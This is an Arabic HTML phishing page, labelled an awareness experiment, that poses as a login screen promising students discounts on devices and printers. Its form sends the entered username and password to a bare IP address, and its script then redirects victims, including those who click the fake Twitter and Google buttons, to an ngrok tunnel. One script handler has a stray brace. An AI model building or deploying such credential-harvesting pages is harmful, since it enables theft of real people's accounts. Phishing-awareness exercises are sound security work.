<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>تسجيل الدخول — تجربة توعية</title>

<!-- استيراد خط "Cairo" من Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<style>
  /* 
    تعريف ألوان وعناصر التصميم الأساسية
    (درجات اللون الأزرق والتدرجات المستخدمة في الأزرار والظلال)
  */
  :root{
    --muted:#6b7280;
    --accent1:#2563eb;
    --accent2:#1e40af;
    --shadow: 0 8px 30px rgba(18,38,63,0.08);
  }

  /* إعداد القواعد العامة للصفحة */
  *{box-sizing:border-box}
  html,body{height:100%}

  body{
    margin:0;
    background: linear-gradient(180deg,#fbfdff 0%, #f6f9ff 60%);
    font-family:'Cairo',system-ui,Arial, sans-serif;
    color:#0f1724;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:40px 16px;
  }

  /* تنسيق الحاوية الرئيسية */
  .container{
    width:100%;
    max-width:820px;
    display:flex;
    gap:40px;
    align-items:center;
    justify-content:center;
  }

  /* القسم التعريفي (النص الترحيبي) */
  .hero{
    flex:1;
    min-width:260px;
    text-align:right;
    padding:20px 10px;
  }

  .hero h1{
    margin:0 0 10px 0;
    font-size:46px;
    line-height:1.02;
    font-weight:700;
    color:#0b1720;
  }

  .hero p{
    margin:12px 0 0 0;
    color:var(--muted);
    font-size:15px;
    max-width:520px;
  }

  /* البطاقة التي تحتوي على نموذج تسجيل الدخول */
  .card{
    flex:1;
    min-width:320px;
    background:#fff;
    border-radius:18px;
    padding:28px;
    box-shadow:var(--shadow);
  }

  /* تنسيق النموذج وعناصره */
  form{
    display:flex;
    flex-direction:column;
    gap:14px
  }

  label{
    font-size:13px;
    color:var(--muted);
    margin-bottom:6px
  }

  .input{display:flex;flex-direction:column;}

  /* تنسيق الحقول النصية وكلمة المرور */
  input[type="text"], input[type="password"]{
    height:50px;
    padding:12px 16px;
    border-radius:12px;
    border:1px solid #d6d9df;
    background:#fbfdff;
    font-size:15px;
    outline:none;
    direction:ltr;
    transition:box-shadow .15s, border-color .15s;
  }

  /* تغيير لون الحدود عند التركيز على الحقل */
  input[type="text"]:focus, input[type="password"]:focus{
    border-color:var(--accent1);
    box-shadow:0 6px 20px rgba(37,99,235,0.12);
  }

  /* زر "متابعة" */
  .btn{
    height:56px;
    border-radius:28px;
    border:0;
    cursor:pointer;
    font-weight:700;
    font-size:18px;
    color:white;
    background:linear-gradient(90deg,var(--accent1),var(--accent2));
    box-shadow:0 8px 20px rgba(37,99,235,0.18);
  }

  /* فاصل بين خيارات تسجيل الدخول */
  .separator{
    display:flex;
    align-items:center;
    gap:12px;
    color:var(--muted);
    margin:6px 0 6px 0;
    font-size:14px;
  }
  .separator::before,.separator::after{
    content:"";
    flex:1;
    height:1px;
    background:#e6e9ef;
    border-radius:2px;
  }

  /* أزرار التسجيل عبر وسائل التواصل الاجتماعي */
  .socials{
    display:flex;
    flex-direction:column;
    gap:10px;
    margin-top:6px
  }

  .social-btn{
    height:52px;
    border-radius:12px;
    border:1px solid #d6d9df;
    background:white;
    display:flex;
    align-items:center;
    gap:12px;
    padding:0 14px;
    font-weight:600;
  }

  /* زر تويتر */
  .fb{
    background:#2d6fb2;
    color:white;
    border:0
  }

  /* زر جوجل */
  .gg{
    background:white;
    color:#333
  }

  /* النصوص الإضافية الصغيرة */
  .muted{
    font-size:13px;
    color:var(--muted);
    text-align:center;
    margin-top:10px
  }

  /* ملاحظة (مخفية افتراضياً) */
  .notice{
    display:none;
    margin-top:14px;
    padding:14px;
    border-radius:12px;
    background:#fff7ed;
    border:1px solid #ffdcb3;
    color:#7a4a13;
    font-size:14px;
  }

  /* تصميم متجاوب للشاشات الصغيرة (جوالات) */
  @media (max-width:900px){
    .container{flex-direction:column;max-width:520px}
    .hero h1{font-size:36px;text-align:center}
    .hero{order:-1;text-align:center}
    .card{width:100%}
  }
</style>
</head>

<body>

  <!-- الحاوية الرئيسية التي تحتوي على النص الترحيبي ونموذج التسجيل -->
  <div class="container" role="main">
    
    <!-- القسم التعريفي (رسالة للطالب) -->
    <div class="hero" aria-hidden="false">
      <h1>عزيزي الطالب، استفد من خصوماتك الحصرية</h1>
      <p>خصومات على الأجهزة والطابعات — سجل الآن واغتنم الفرصة.</p>
    </div>

    <!-- نموذج تسجيل الدخول -->
    <div class="card" aria-labelledby="signin-heading">
      <h2 id="signin-heading" style="margin:0 0 12px 0;text-align:center;font-size:20px;font-weight:700;color:#0b1720">
        تسجيل الدخول
      </h2>

      <form id="login-form" action="http://172.16.132.133/" method="POST" autocomplete="off">
        
        <!-- حقل البريد الإلكتروني -->
        <div class="input">
          <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
          <input id="email" name="email" type="text" placeholder="مثال: name@example.com" aria-label="Email or username" required>
        </div>

        <!-- حقل كلمة المرور -->
        <div class="input">
          <label for="password">كلمة المرور</label>
          <input id="password" name="password" type="password" placeholder="أدخل كلمة المرور" aria-label="Password" required>
        </div>

        <!-- زر الإرسال -->
        <button class="btn" type="submit" id="continue-btn">متابعة</button>

        <!-- فاصل بين خيارات الدخول -->
        <div class="separator" aria-hidden="true"><span>أو</span></div>

        <!-- أزرار الدخول عبر حسابات التواصل -->
        <div class="socials" aria-hidden="false">
          <button type="button" class="social-btn fb" aria-label="Continue with Twitter">استمرار عبر تويتر</button>
          <button type="button" class="social-btn gg" aria-label="Continue with Google">استمرار عبر جوجل</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    // عند إرسال النموذج، يتم إعادة التوجيه تلقائياً بعد نصف ثانية
    document.getElementById("login-form").addEventListener("submit", function () {
      setTimeout(() => {
        window.location.href = "https://lora-reconciliatory-jacinto.ngrok-free.dev";
      }, 500);
    });

    // عند الضغط على أزرار تسجيل الدخول الاجتماعي، يظهر تأكيد ثم إعادة توجيه
    document.querySelectorAll(".social-btn").forEach(btn => {
    btn.addEventListener("click", function () {
      setTimeout(() => {
        window.location.href = "https://lora-reconciliatory-jacinto.ngrok-free.dev";
      }, 500);
        }
      });
    });
  </script>

</body>
</html>
